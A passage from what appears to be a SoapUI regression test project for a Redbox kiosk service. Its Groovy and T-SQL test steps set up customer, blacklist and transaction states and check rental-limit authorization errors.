def updateTransaction = rbsql.execute("Update [Transaction] Set RentalType = 3 Where Transaction_ID = $TransactionID");</script></con:config></con:testStep><con:testStep type="jdbc" name="CustomerSetup" id="4de2c9aa-301b-458b-9066-443e2385c333"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>DECLARE @firstSuccessTxn datetime2,
		@isNew_Customer int,
		@CustomerID CHAR(20),
		@fName  nvarchar(50),
		@lName nvarchar(50)
	SET @CustomerID=:CID
	SET @isNew_Customer = :isNewCustomer
	SET @FName = :FName
	SET @LName = :LName
		
if(@isNew_Customer=1)
BEGIN
	if not exists (
					select FirstSuccessTransaction from Customer 
					where Customer_ID=@CustomerID and FirstSuccessTransaction is null
					)
		BEGIN
				update Customer set FirstSuccessTransaction=null where Customer_ID=@CustomerID
		END
END

ELSE
	BEGIN
	--Check if customer is new, customer firstsuccess transaction passed 4 hrs is existing.
	if not exists (
		select FirstSuccessTransaction,* from Customer 
		where Customer_ID=@CustomerID and 
		 FirstSuccessTransaction&lt;(DATEADD(hour,-4,getdate()))
		)

		BEGIN
			if exists (select FirstSuccessTransaction from Customer 
						where Customer_ID=@CustomerID and FirstSuccessTransaction is null
					  )
				BEGIN
					update Customer set FirstSuccessTransaction=GETDATE()where Customer_ID=@CustomerID
				END
				
			set @firstSuccessTxn= DATEADD(hour,-5,(select FirstSuccessTransaction from Customer where Customer_ID=@CustomerID))
			update Customer set FirstSuccessTransaction=@firstSuccessTxn where Customer_ID=@CustomerID
			
		END
	END
--Check and remove customer from if blacklisted.
if exists(select * from Blacklist where Pattern = (@lName+' '+@fName) or Pattern = (@fName+' '+@lName) )
	BEGIN
		DELETE FROM Blacklist WHERE Pattern = (@lName+' '+@fName) or Pattern = (@fName+' '+@lName)
	END</con:query><con:assertion type="JDBC Status" id="ee7291cb-19fa-48ad-b32f-d2f99c0ee30d" name="JDBC Status"/><con:assertion type="GroovyScriptAssertion" id="676ae901-94a3-4ead-8912-b3df1faa5184" name="Script Assertion"><con:configuration><scriptText>def responseAsXml = context.expand( '${CustomerSetUp#ResponseAsXml#//Results[1]/UpdateCount[1]}' )
log.info ("responseAsXml:$responseAsXml");
assert (responseAsXml=(-1)||(responseAsXml=1))</scriptText></con:configuration></con:assertion><con:properties><con:property><con:name>CID</con:name><con:value>${#TestCase#CustomerID}</con:value></con:property><con:property><con:name>isNewCustomer</con:name><con:value>${DataSource#IsNewCustomer}</con:value></con:property><con:property><con:name>FName</con:name><con:value>Redbox</con:value></con:property><con:property><con:name>LName</con:name><con:value>Server</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="groovy" name="UpdateCustomerAsRequired" id="c3383aeb-8132-4de2-b265-fac672b86419"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status

//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def ConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('CustomerProfileSvc');
def constring = ConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(constring);

def isBlacklist = context.expand( '${DataSource#IsBlacklist}' )
def customerStatus = context.expand( '${DataSource#CustomerStatus}' )
def isNewCustomer = context.expand( '${DataSource#isNewCustomer}' )
def customerActive = context.expand( '${DataSource#CustomerActive}' )
def isRentOnly = context.expand( '${DataSource#IsRentOnly}' );
def cardAccountId = context.expand( '${#TestCase#CardAccountId}' );

if (Integer.parseInt(isBlacklist)==1) 
{
	log.info("Black listing customer existing customer")
	//new customer is not expected to be blacklisted.
	assert isNewCustomer.toInteger()==0: 'New customer can not be blacklisted'
	testRunner.runTestStepByName("BlackListCustomer")
}
else
{	
	log.info("Black listing customer escaped.")	
}

if (customerStatus.toInteger()==2 || customerStatus.toInteger()==3 || customerActive.toInteger()==0)
{
	log.info("customer disable line with status :. "+customerStatus)
	testRunner.runTestStepByName("CustomerSuspended_Deactivated")
}
else
{	assert customerStatus.toInteger()==1
	assert customerActive.toInteger()==1
}

if (Integer.parseInt(isNewCustomer)==1)
{
	//Build SQL Script
	sqlScript = ""
	sqlScript += "Update AccountAttribute Set ValueText = null ";
	sqlScript += "\n";
	sqlScript += "Where EntityTypeAttributeId = (Select EntityTypeAttributeId from EntityTypeAttribute Where AttributeId = (Select AttributeId from Attribute Where AttributeName like '%FirstSuccessfulTransaction%'))";
	sqlScript += "\n";
	sqlScript += "and AccountId = (Select AccountId from Account Where MerchantServiceCardAccountId = $cardAccountId)";
	
	log.info("FirstSuccessfulTransaction to NULL: " +sql.executeUpdate(sqlScript))
	
}
else
{
	//Build SQL Script
	sqlScript = ""
	sqlScript += "Update AccountAttribute Set ValueText = '11/1/2018 8:06:37 PM' ";
	sqlScript += "\n";
	sqlScript += "Where EntityTypeAttributeId = (Select EntityTypeAttributeId from EntityTypeAttribute Where AttributeId = (Select AttributeId from Attribute Where AttributeName like '%FirstSuccessfulTransaction%'))";
	sqlScript += "\n";
	sqlScript += "and AccountId = (Select AccountId from Account Where MerchantServiceCardAccountId = $cardAccountId)";
	
	log.info("FirstSuccessfulTransaction to OLD: " +sql.executeUpdate(sqlScript))
}

//testRunner.gotoStepByName("Auth");
if (isRentOnly == '1')
{
	testRunner.gotoStepByName( "Authorize")
	log.info("Going to - Authorize Step")
}
else
{
	testRunner.gotoStepByName( "Check Flag")
	log.info ("Going to - Check Flag Step");
}</script></con:config></con:testStep><con:testStep type="jdbc" name="BlackListCustomer" id="6509aaf7-a8e0-4d10-aced-ec8fb2c606d0"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>declare @fName  nvarchar(20),
		@lName nvarchar(20),
		@blacklistType int,
		@val nvarchar(20)
		
		set @fName=:firstname
		set @lName=:lastname
		set @blacklistType = NULL 
		if  :blacklisttype_ID &lt;> ''
			BEGIN set @blacklistType = :blacklisttype_ID
			END
		set @val =:value
		
if not exists(select * from Blacklist where Pattern = (@lName+' '+@fName))
	BEGIN
		INSERT INTO Blacklist(Pattern,BlacklistTypeID,Value)
		values (@lName+' '+@fName,@blacklistType,@val);
	END
Else
BEGIN
	update Blacklist set BlacklistTypeID=@blacklistType, Value=@val where Pattern =(@lName+' '+@fName)
END

if not exists(select * from Blacklist where Pattern=(@fName+' '+@lName))
	BEGIN
		INSERT INTO Blacklist(Pattern,BlacklistTypeID,Value)
		values (@fName+' '+@lName,@blacklistType,@val);
	END
Else
BEGIN
	update Blacklist set BlacklistTypeID=@blacklistType, Value=@val where Pattern=(@fName+' '+@lName)
END</con:query><con:assertion type="Simple Contains" name="Contains" id="c5a8b320-5b80-4115-bf0d-3756b6854300"><con:configuration><token>UpdateCount</token><ignoreCase>false</ignoreCase><useRegEx>false</useRegEx></con:configuration></con:assertion><con:assertion type="JDBC Status" id="e0a646b1-c3d8-490a-b3da-9f481cbc0fe5" name="JDBC Status"/><con:properties><con:property><con:name>firstname</con:name><con:value>Redbox</con:value></con:property><con:property><con:name>lastname</con:name><con:value>Server</con:value></con:property><con:property><con:name>value</con:name><con:value>${DataSource#BlacklistValue}</con:value></con:property><con:property><con:name>blacklisttype_ID</con:name><con:value>${DataSource#BlacklistTypeID}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="jdbc" name="CustomerSuspended_Deactivated" id="5199e454-ec05-451d-9dc3-0c58174554e4"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>if exists (select * from Customer where Customer_ID = :CustomerID  )
	begin
		update Customer set Status=:CStatus ,Active=:CActive 
		where Customer_ID=:CustomerID
	end
</con:query><con:assertion type="XPath Match" name="XPath Match" id="68e29561-1178-4960-aec1-3602a508a383"><con:configuration><path>//Results[1]/UpdateCount[1]</path><content>1</content><allowWildcards>false</allowWildcards><ignoreNamspaceDifferences>false</ignoreNamspaceDifferences><ignoreComments>false</ignoreComments></con:configuration></con:assertion><con:assertion type="JDBC Status" id="810223cb-55c7-44a4-96e9-73c09045e3f1" name="JDBC Status"/><con:properties><con:property><con:name>CStatus</con:name><con:value>${DataSource#CustomerStatus}</con:value></con:property><con:property><con:name>CActive</con:name><con:value>${DataSource#CustomerActive}</con:value></con:property><con:property><con:name>CustomerID</con:name><con:value>${#TestCase#CustomerID}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="groovy" name="ResvAuth" id="a746bed6-3fa6-4a1f-a296-33a1efa41f37"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status
//Set properties from Data Source
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["ResvAuth"];
//Cleaning up the properties; set the values to NULL before the start
for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}
tc.setPropertyValue("UseCredits", '0');
tc.setPropertyValue("RentalTaxRate", context.expand( '${#TestCase#RentalTaxRate}' ));
tc.setPropertyValue("PurchaseTaxRate", context.expand( '${#TestCase#PurchaseTaxRate}' ));
tc.setPropertyValue("DigitalPurchaseTaxRate", context.expand( '${#TestCase#DigitalPurchaseTaxRate}' ));
//tc.setPropertyValue("IsOffline", context.expand( '${DataSource#IsOffline}' ));
tc.setPropertyValue("ReferenceNumber", context.expand( '${#TestCase#ReferenceNumber}' ));
tc.setPropertyValue("recoFormats", context.expand( '${DataSource#recoFormats}' ));
tc.setPropertyValue("numOfRecos", context.expand( '${DataSource#numOfRecos}' ));
tc.setPropertyValue('ModifiedCart', 'true');

//Get properties from Authorize test case from test suite Generic Steps (KioskService).
def authtc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Authorize"];
tc.setPropertyValue("Email", authtc.getPropertyValue("Email"));
tc.setPropertyValue("KioskID", authtc.getPropertyValue("KioskID"));
tc.setPropertyValue("PurchaseCount", authtc.getPropertyValue("PurchaseCount"));
tc.setPropertyValue("PurchaseBarcodes", authtc.getPropertyValue("PurchaseBarcodes"));
tc.setPropertyValue("PurchaseTitleIds", authtc.getPropertyValue("PurchaseTitleIds"));
tc.setPropertyValue("PurchaseProductFamily", authtc.getPropertyValue("PurchaseProductFamily"));
tc.setPropertyValue("PurchaseProductType", authtc.getPropertyValue("PurchaseProductType"));
tc.setPropertyValue("PurchaseDiscPrice", authtc.getPropertyValue("PurchaseDiscPrice"));
tc.setPropertyValue("RentalCount", authtc.getPropertyValue("RentalCount"));
tc.setPropertyValue("RentalBarcodes", authtc.getPropertyValue("RentalBarcodes"));
tc.setPropertyValue("RentalTitleIds", authtc.getPropertyValue("RentalTitleIds"));
tc.setPropertyValue("RentalProductFamily", authtc.getPropertyValue("RentalProductFamily"));
tc.setPropertyValue("RentalProductType", authtc.getPropertyValue("RentalProductType"));
tc.setPropertyValue("RentalDiscPrice", authtc.getPropertyValue("RentalDiscPrice"));
tc.setPropertyValue("RentalNonReturnPrice", authtc.getPropertyValue("RentalNonReturnPrice"));
tc.setPropertyValue("RentalNonReturnDays", authtc.getPropertyValue("RentalNonReturnDays"));
tc.setPropertyValue("HasPhysicalPurchase", authtc.getPropertyValue("HasPhysicalPurchase"));
tc.setPropertyValue("DiscountPayload", authtc.getPropertyValue("DiscountPayload"));
tc.setPropertyValue("CCPayload", authtc.getPropertyValue("CCPayload"));
tc.setPropertyValue("PromoCode", authtc.getPropertyValue("PromoCode"));
tc.setPropertyValue("PromoValue", authtc.getPropertyValue("AppliedPromoValue"));
tc.setPropertyValue("CustomerProfileNumber", authtc.getPropertyValue("CustomerProfileNumber"));
tc.setPropertyValue("EstimatedLoyaltyAmount", authtc.getPropertyValue("EstimatedLoyaltyAmount"));
tc.setPropertyValue("HasLoyaltyDiscount", authtc.getPropertyValue("HasLoyaltyDiscount"));
tc.setPropertyValue("HasPromoDiscount", authtc.getPropertyValue("HasPromoDiscount"));
tc.setPropertyValue("TransactionID", authtc.getPropertyValue("TransactionID"));
tc.setPropertyValue("InvoiceID", authtc.getPropertyValue("InvoiceID"));
tc.setPropertyValue("EnableServiceFee", authtc.getPropertyValue("EnableServiceFee"));
tc.setPropertyValue("ServiceFeePayload", authtc.getPropertyValue("ServiceFeePayload"));
tc.setPropertyValue("ServiceFeeTaxRate", context.expand( '${#TestCase#ServiceFeeTaxRate}' ));
tc.setPropertyValue("ServiceFeeAmount", context.expand( '${#TestCase#ServiceFeeAmount}' ));

def runner = tc.run( null, false );
// show that it worked out ok
log.info("Status: $runner.status, time taken for TestCase [ResvAuth] was: $runner.timeTaken ms");
def tcStatus = (runner.status).toString()
if(tcStatus == "FAIL")
{
	assert runner.status == Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","ResvAuth $tcStatus");
	testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}
else
{
	// assert that it didn't fail
	assert runner.status != Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","ResvAuth $tcStatus");
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}</script></con:config></con:testStep><con:testStep type="groovy" name="ModResvPickup" id="5b622329-33cd-4556-9b11-de3fb99cd2e5"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status

def isOffline = context.expand( '${DataSource#IsOffline}' );

//Set properties from Data Source
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["ModResvPickup"];
//Cleaning up the properties; set the values to NULL before the start
for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}
tc.setPropertyValue("UseCredits", '0');

tc.setPropertyValue("RentalTaxRate", context.expand( '${#TestCase#RentalTaxRate}' ));
tc.setPropertyValue("PurchaseTaxRate", context.expand( '${#TestCase#PurchaseTaxRate}' ));
tc.setPropertyValue("DigitalPurchaseTaxRate", context.expand( '${#TestCase#DigitalPurchaseTaxRate}' ));
tc.setPropertyValue("RentalVendStatus", context.expand( '${DataSource#RecoVendStatus}' ) + "," + context.expand( '${DataSource#RentalVendStatus}' ));
tc.setPropertyValue("PurchaseVendStatus", context.expand( '${DataSource#PurchaseVendStatus}' ));
tc.setPropertyValue("PurchaseVendStatus", context.expand( '${DataSource#PurchaseVendStatus}' ));
tc.setPropertyValue("IsOffline", context.expand( '${DataSource#IsOffline}' ));
tc.setPropertyValue("ReferenceNumber", context.expand( '${#TestCase#ReferenceNumber}' ));

//Get properties from Authorize test case from test suite Generic Steps (KioskService).
def authtc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["ResvAuth"];
tc.setPropertyValue("Email", authtc.getPropertyValue("Email"));
tc.setPropertyValue("KioskID", authtc.getPropertyValue("KioskID"));
tc.setPropertyValue("PurchaseCount", authtc.getPropertyValue("PurchaseCount"));
tc.setPropertyValue("PurchaseBarcodes", authtc.getPropertyValue("PurchaseBarcodes"));
tc.setPropertyValue("PurchaseTitleIds", authtc.getPropertyValue("PurchaseTitleIds"));
tc.setPropertyValue("PurchaseProductFamily", authtc.getPropertyValue("PurchaseProductFamily"));
tc.setPropertyValue("PurchaseProductType", authtc.getPropertyValue("PurchaseProductType"));
tc.setPropertyValue("PurchaseDiscPrice", authtc.getPropertyValue("PurchaseDiscPrice"));
tc.setPropertyValue("RentalCount", authtc.getPropertyValue("RentalCount"));
tc.setPropertyValue("RentalBarcodes", authtc.getPropertyValue("RentalBarcodes"));
tc.setPropertyValue("RentalTitleIds", authtc.getPropertyValue("RentalTitleIds"));
tc.setPropertyValue("RentalProductFamily", authtc.getPropertyValue("RentalProductFamily"));
tc.setPropertyValue("RentalProductType", authtc.getPropertyValue("RentalProductType"));
tc.setPropertyValue("RentalDiscPrice", authtc.getPropertyValue("RentalDiscPrice"));
tc.setPropertyValue("RentalNonReturnPrice", authtc.getPropertyValue("RentalNonReturnPrice"));
tc.setPropertyValue("RentalNonReturnDays", authtc.getPropertyValue("RentalNonReturnDays"));
tc.setPropertyValue("HasPhysicalPurchase", authtc.getPropertyValue("HasPhysicalPurchase"));
tc.setPropertyValue("DiscountPayload", authtc.getPropertyValue("DiscountPayload"));
tc.setPropertyValue("ItemSourceType", authtc.getPropertyValue("ItemSourceType"));
tc.setPropertyValue("CCPayload", authtc.getPropertyValue("CCPayload"));
tc.setPropertyValue("PromoCode", authtc.getPropertyValue("PromoCode"));
tc.setPropertyValue("PromoValue", authtc.getPropertyValue("PromoValue"));
tc.setPropertyValue("CustomerProfileNumber", authtc.getPropertyValue("CustomerProfileNumber"));
tc.setPropertyValue("EstimatedLoyaltyAmount", authtc.getPropertyValue("EstimatedLoyaltyAmount"));
tc.setPropertyValue("HasLoyaltyDiscount", authtc.getPropertyValue("HasLoyaltyDiscount"));
tc.setPropertyValue("HasPromoDiscount", authtc.getPropertyValue("HasPromoDiscount"));
tc.setPropertyValue("EnableServiceFee", authtc.getPropertyValue("EnableServiceFee"));
//tc.setPropertyValue("HasUpsell",authtc.getPropertyValue("HasUpsell"));
tc.setPropertyValue("ServiceFeePayload", authtc.getPropertyValue("ServiceFeePayload"));
tc.setPropertyValue("ModifiedCart", "true");


if (isOffline == 'true')
{
	//For Offline set the values to NULL
	tc.setPropertyValue("TransactionID", "null");
	tc.setPropertyValue("InvoiceID", "");
}
else
{
	tc.setPropertyValue("TransactionID", authtc.getPropertyValue("TransactionID"));
	tc.setPropertyValue("InvoiceID", authtc.getPropertyValue("InvoiceID"));
}

//tc.setPropertyValue("IsOffline", "false"); //hardCoded for time being.

def runner = tc.run( null, false );
// show that it worked out ok
log.info("Status: $runner.status, time taken for TestCase [ModResvPickup] was: $runner.timeTaken ms");
def tcStatus = (runner.status).toString()
if(tcStatus == "FAIL")
{
	assert runner.status == Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","ModResvPickup $tcStatus");
	testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}
else
{
	// assert that it didn't fail
	assert runner.status != Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","ModResvPickup $tcStatus");
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}</script></con:config></con:testStep><con:testStep type="groovy" name="Check Flag" id="624706ce-d637-4aa5-a219-716db0430043"><con:settings/><con:config><script>def IsRentOnly = context.expand( '${DataSource#IsRentOnly}' );

if (IsRentOnly == '1')
{
	log.info 'Going to DataSource Loop';
	testRunner.testCase.setPropertyValue("previousFlag",IsRentOnly);
	testRunner.gotoStepByName( "CleanUp")
}
else
{
	testRunner.gotoStepByName( "Build Authorize Message")
}</script></con:config></con:testStep><con:testStep type="groovy" name="Build Authorize Message" id="da45f147-269d-48d0-8abd-1da079963b0a"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status
//Set properties from Data Source
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["ResvAuth"];
//Cleaning up the properties; set the values to NULL before the start
for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}
tc.setPropertyValue("UseCredits", '0');
tc.setPropertyValue("RentalTaxRate", context.expand( '${#TestCase#RentalTaxRate}' ));
tc.setPropertyValue("PurchaseTaxRate", context.expand( '${#TestCase#PurchaseTaxRate}' ));
tc.setPropertyValue("DigitalPurchaseTaxRate", context.expand( '${#TestCase#DigitalPurchaseTaxRate}' ));
//tc.setPropertyValue("IsOffline", context.expand( '${DataSource#IsOffline}' ));
tc.setPropertyValue("ReferenceNumber", context.expand( '${#TestCase#ReferenceNumber}' ));
tc.setPropertyValue("recoFormats", context.expand( '${DataSource#recoFormats}' ));
tc.setPropertyValue("numOfRecos", context.expand( '${DataSource#numOfRecos}' ));
tc.setPropertyValue('ModifiedCart', 'true');
tc.setPropertyValue('justBuildRequest', 'true');

//Get properties from Authorize test case from test suite Generic Steps (KioskService).
def authtc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Authorize"];
tc.setPropertyValue("Email", authtc.getPropertyValue("Email"));
tc.setPropertyValue("KioskID", authtc.getPropertyValue("KioskID"));
tc.setPropertyValue("PurchaseCount", authtc.getPropertyValue("PurchaseCount"));
tc.setPropertyValue("PurchaseBarcodes", authtc.getPropertyValue("PurchaseBarcodes"));
tc.setPropertyValue("PurchaseTitleIds", authtc.getPropertyValue("PurchaseTitleIds"));
tc.setPropertyValue("PurchaseProductFamily", authtc.getPropertyValue("PurchaseProductFamily"));
tc.setPropertyValue("PurchaseProductType", authtc.getPropertyValue("PurchaseProductType"));
tc.setPropertyValue("PurchaseDiscPrice", authtc.getPropertyValue("PurchaseDiscPrice"));
tc.setPropertyValue("RentalCount", authtc.getPropertyValue("RentalCount"));
tc.setPropertyValue("RentalBarcodes", authtc.getPropertyValue("RentalBarcodes"));
tc.setPropertyValue("RentalTitleIds", authtc.getPropertyValue("RentalTitleIds"));
tc.setPropertyValue("RentalProductFamily", authtc.getPropertyValue("RentalProductFamily"));
tc.setPropertyValue("RentalProductType", authtc.getPropertyValue("RentalProductType"));
tc.setPropertyValue("RentalDiscPrice", authtc.getPropertyValue("RentalDiscPrice"));
tc.setPropertyValue("RentalNonReturnPrice", authtc.getPropertyValue("RentalNonReturnPrice"));
tc.setPropertyValue("RentalNonReturnDays", authtc.getPropertyValue("RentalNonReturnDays"));
tc.setPropertyValue("HasPhysicalPurchase", authtc.getPropertyValue("HasPhysicalPurchase"));
tc.setPropertyValue("DiscountPayload", authtc.getPropertyValue("DiscountPayload"));
tc.setPropertyValue("CCPayload", authtc.getPropertyValue("CCPayload"));
tc.setPropertyValue("PromoCode", authtc.getPropertyValue("PromoCode"));
tc.setPropertyValue("PromoValue", authtc.getPropertyValue("AppliedPromoValue"));
tc.setPropertyValue("CustomerProfileNumber", authtc.getPropertyValue("CustomerProfileNumber"));
tc.setPropertyValue("EstimatedLoyaltyAmount", authtc.getPropertyValue("EstimatedLoyaltyAmount"));
tc.setPropertyValue("HasLoyaltyDiscount", authtc.getPropertyValue("HasLoyaltyDiscount"));
tc.setPropertyValue("HasPromoDiscount", authtc.getPropertyValue("HasPromoDiscount"));
tc.setPropertyValue("TransactionID", authtc.getPropertyValue("TransactionID"));
tc.setPropertyValue("InvoiceID", authtc.getPropertyValue("InvoiceID"));
tc.setPropertyValue("EnableServiceFee", authtc.getPropertyValue("EnableServiceFee"));
tc.setPropertyValue("ServiceFeePayload", authtc.getPropertyValue("ServiceFeePayload"));
tc.setPropertyValue("ServiceFeeTaxRate", context.expand( '${#TestCase#ServiceFeeTaxRate}' ));
tc.setPropertyValue("ServiceFeeAmount", context.expand( '${#TestCase#ServiceFeeAmount}' ));
//MDV
tc.setPropertyValue("RentalMDVFlag", authtc.getPropertyValue("RentalMDVFlag"));
tc.setPropertyValue("RentalMDVDiscNumber", authtc.getPropertyValue("RentalMDVDiscNumber"));
tc.setPropertyValue("PurchaseMDVFlag", authtc.getPropertyValue("PurchaseMDVFlag"));
tc.setPropertyValue("PurchaseMDVDiscNumber", authtc.getPropertyValue("PurchaseMDVDiscNumber"));

def runner = tc.run( null, false );
// show that it worked out ok
log.info("Status: $runner.status, time taken for TestCase [ResvAuth] was: $runner.timeTaken ms");
def tcStatus = (runner.status).toString()
if(tcStatus == "FAIL")
{
	assert runner.status == Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","ResvAuth $tcStatus");
	testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}
else
{
	// assert that it didn't fail
	assert runner.status != Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","ResvAuth $tcStatus");
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}

testRunner.testCase.setPropertyValue("RequestBody",tc.getPropertyValue("RequestBody"));</script></con:config></con:testStep><con:testStep type="httprequest" name="Authorize (Request)" id="feced15a-f5f9-46a2-8e90-79549c898fa7"><con:settings/><con:config method="POST" xsi:type="con:HttpRequest" id="3cccb4e7-8653-4156-bda1-d7cf3db77175" name="Authorize (Request)" postQueryString="false" mediaType="application/x-www-form-urlencoded" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;xml-fragment/></con:setting></con:settings><con:endpoint>${#Project#KSEndpoint}</con:endpoint><con:request>${#TestCase#RequestBody}</con:request><con:assertion type="GroovyScriptAssertion" id="e19a2917-6c3e-4c7d-9017-36bfc6108097" name="Check for Success and HasErrors"><con:configuration><scriptText>import groovy.json.JsonSlurper
def response = URLDecoder.decode(messageExchange.getResponseContent())
log.info ("ResvAuth Response: $response");
assert response.contains("\"Success\":false,");
assert response.contains("\"HasErrors\":true,");
assert response.contains("\"Message\":\""+context.expand( '${#DataSource#ErrorMessage}' ));

def errorMessage = context.expand( '${#DataSource#ErrorMessage}' );
def isNewCustomer = context.expand( '${DataSource#IsNewCustomer}' ).toInteger();
if (errorMessage == 'RENTAL LIMIT EXCEEDED')
{
	if (isNewCustomer == 1)
	{
		assert response.contains("\"Code\":\"(A028)\",");
	}
	else
	{
		assert response.contains("\"Code\":\"(A003)\",");
	}
}
</scriptText></con:configuration></con:assertion><con:credentials><con:selectedAuthProfile>No Authorization</con:selectedAuthProfile><con:authType>No Authorization</con:authType></con:credentials><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:parameters/><con:environmentSpec><con:entry environmentId="89af881e-f595-49db-a4c0-41c56655f73e"><con:authProfile>No Authorization</con:authProfile></con:entry><con:entry environmentId="fa7da7e9-a4d1-4890-bb22-6c455823cd98"><con:authProfile>No Authorization</con:authProfile></con:entry><con:entry environmentId="7fb02c16-2b47-45a0-a0a6-2eda6b690081"><con:authProfile>No Authorization</con:authProfile></con:entry><con:entry environmentId="bff3f14b-e680-473b-bba1-89a50bc86a72"><con:authProfile>No Authorization</con:authProfile></con:entry></con:environmentSpec></con:config></con:testStep><con:testStep type="groovy" name="CheckResponse" id="3d911ce1-d612-46e6-b4fa-aa2d14467053" disabled="true"><con:settings/><con:config><script>def previousFlag = context.expand( '${#TestCase#previousFlag}' )
def isRentOnly = context.expand( '${RentalData#IsRentOnly}' )
log.info ('Rental Limit Flag : ' + isRentOnly);
if (isRentOnly == '0' &amp;&amp; previousFlag == '1')
{
	log.info 'Calling Return';
	testRunner.testCase.testSuite.project.testSuites["Kiosk Service Regression Others"].testCases["Auth_Failure(TSS)"].setPropertyValue("previousFlag",isRentOnly);
	testRunner.gotoStepByName( "Set Reference Number")
}
else
{
	testRunner.gotoStepByName( "CleanUp")
	testRunner.testCase.testSuite.project.testSuites["Kiosk Service Regression Others"].testCases["Auth_Failure(TSS)"].setPropertyValue("previousFlag",isRentOnly);
	log.info 'Going to DataSource Loop';
}
</script></con:config></con:testStep><con:testStep type="jdbc" name="GetTransactionID" id="5fa7b64b-d75b-4a6f-b6ed-026fd52bfd7b"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>Select top 1 
	t.Transaction_ID,
	t.Transaction_Status
From
	[Transaction] t
Inner Join 
	Disc_Transaction dt 
On 
	t.Transaction_ID = dt.Transaction_ID
Inner Join 
	Disc d 
on 
	dt.Title_ID = d.Title_ID
Where 
	t.KioskClient_ID = :KioskClient_ID 
and 
	t.RentalType in (1,2) 
and 
